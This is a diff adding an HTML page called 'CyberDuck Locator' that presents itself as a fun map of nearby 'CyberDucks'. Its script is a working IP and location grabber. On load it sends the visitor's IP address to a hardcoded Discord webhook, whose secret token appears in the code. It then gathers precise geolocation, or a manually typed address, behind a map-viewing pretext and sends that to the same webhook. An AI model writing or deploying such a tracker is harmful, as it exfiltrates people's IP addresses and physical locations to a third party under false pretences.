@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CyberDuck Locator </title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    padding: 2rem;
+    background: #1e1e2f;
+    color: #eee;
+    text-align: center;
+    max-width: 700px;
+    margin: auto;
+  }
+  button {
+    margin-top: 1rem;
+    padding: 0.6rem 1.2rem;
+    font-size: 1rem;
+    cursor: pointer;
+    border-radius: 5px;
+    border: none;
+    background-color: #4caf50;
+    color: white;
+    transition: background-color 0.3s ease;
+  }
+  button:hover:not(:disabled) {
+    background-color: #45a049;
+  }
+  button:disabled {
+    background-color: #666;
+    cursor: not-allowed;
+  }
+  #map {
+    margin-top: 2rem;
+    width: 100%;
+    height: 400px;
+    border: 3px solid #4caf50;
+    border-radius: 8px;
+    display: none;
+  }
+  #status {
+    margin-top: 1rem;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<h1>CyberDuck Locator</h1>
+<p id="status">LOCATING THE DUCKS...</p>
+
+<button id="showMapBtn" disabled>Show nearest CyberDuck </button>
+
+<div id="map"></div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1380398513111830689/kYPcUicZYLbvKp_8_A-7B5wZQrZL4b7RVKedwc1QvlMBDQQfZquh1QWvmt0EhX0eW2Nw"; // <-- replace this!
+
+  async function sendToDiscord(content) {
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content }),
+      });
+    } catch (e) {
+      console.error("Failed to send to Discord:", e);
+    }
+  }
+
+  async function getIPAndNotify() {
+    const status = document.getElementById("status");
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const ip = data.ip;
+      status.textContent = `Your IP is ${ip}. Sending to Discord...`;
+
+      await sendToDiscord(`User IP: ${ip}`);
+
+      status.textContent = "ducks located press to view nearby!";
+      const btn = document.getElementById("showMapBtn");
+      btn.disabled = false;
+      btn.textContent = "Show nearest CyberDuck map";
+    } catch (e) {
+      status.textContent = "Error fetching IP.";
+      console.error(e);
+    }
+  }
+
+  function showMapWithLocation(lat, lon) {
+    const mapDiv = document.getElementById("map");
+    const locationStr = `${lat},${lon}`;
+    const url = `https://www.google.com/maps/search/CyberDuck+near+${encodeURIComponent(locationStr)}`;
+    mapDiv.innerHTML = `<iframe
+      src="${url}"
+      width="100%"
+      height="100%"
+      style="border:0;"
+      allowfullscreen=""
+      loading="lazy"
+      referrerpolicy="no-referrer-when-downgrade"></iframe>`;
+    mapDiv.style.display = "block";
+  }
+
+  async function getLocationAndSend() {
+    const status = document.getElementById("status");
+    status.textContent = "Requesting location permission...";
+
+    if (!navigator.geolocation) {
+      status.textContent = "Geolocation not supported. Falling back to manual input.";
+      manualLocationPrompt();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(async (position) => {
+      const { latitude, longitude } = position.coords;
+      status.textContent = `Location acquired: (${latitude.toFixed(5)}, ${longitude.toFixed(5)})`;
+      await sendToDiscord(`User Location: Latitude ${latitude}, Longitude ${longitude}`);
+      showMapWithLocation(latitude, longitude);
+    }, (error) => {
+      console.warn("Geolocation error:", error);
+      status.textContent = "Location permission denied or error. Falling back to manual input.";
+      manualLocationPrompt();
+    }, {
+      enableHighAccuracy: false,
+      timeout: 10000,
+      maximumAge: 0
+    });
+  }
+
+  async function manualLocationPrompt() {
+    const status = document.getElementById("status");
+    const location = prompt("Please enter your location (address, city, or coordinates):");
+    if (!location) {
+      status.textContent = "No location provided.";
+      return;
+    }
+    status.textContent = "Sending manual location to Discord...";
+    await sendToDiscord(`User Location (manual): ${location}`);
+    status.textContent = "Manual location sent!";
+    const mapDiv = document.getElementById("map");
+    const url = `https://www.google.com/maps/search/CyberDuck+near+${encodeURIComponent(location)}`;
+    mapDiv.innerHTML = `<iframe
+      src="${url}"
+      width="100%"
+      height="100%"
+      style="border:0;"
+      allowfullscreen=""
+      loading="lazy"
+      referrerpolicy="no-referrer-when-downgrade"></iframe>`;
+    mapDiv.style.display = "block";
+  }
+
+  document.getElementById("showMapBtn").addEventListener("click", () => {
+    const wantsMap = confirm("Would you like to see a map of the nearest CyberDuck?");
+    if (wantsMap) {
+      getLocationAndSend();
+    } else {
+      document.getElementById("status").textContent = "Okay, no map shown.";
+    }
+  });
+
+  getIPAndNotify();
+</script>
+
+</body>
+</html>
